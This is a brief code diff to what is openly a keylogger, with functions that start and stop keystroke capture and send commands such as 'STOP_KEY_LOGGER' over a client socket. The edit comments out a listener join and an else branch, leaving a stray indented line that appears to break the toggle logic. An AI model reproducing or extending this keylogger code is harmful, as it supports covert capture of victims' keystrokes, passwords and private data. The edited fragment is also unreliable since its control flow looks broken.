@@ -48,7 +48,7 @@ def key_logger(client_socket):
         except Exception as e:
             print(f"Error receiving data: {e}")
             
-    listener.join()  # Wait for the listener to finish
+    # listener.join()  # Wait for the listener to finish
 
 def toggle_key_logger(client_socket):
     global keylogger_running
@@ -57,7 +57,6 @@ def toggle_key_logger(client_socket):
         print("Starting keylogger...")
         keylogger_running = True
         key_logger(client_socket)
-    else:
-        client_socket.sendall("STOP_KEY_LOGGER".encode())
-        # print("Stopping keylogger...")
+    # else:
+        client_socket.sendall("STOP_KEY_LOGGER".encode())        
         keylogger_running = False
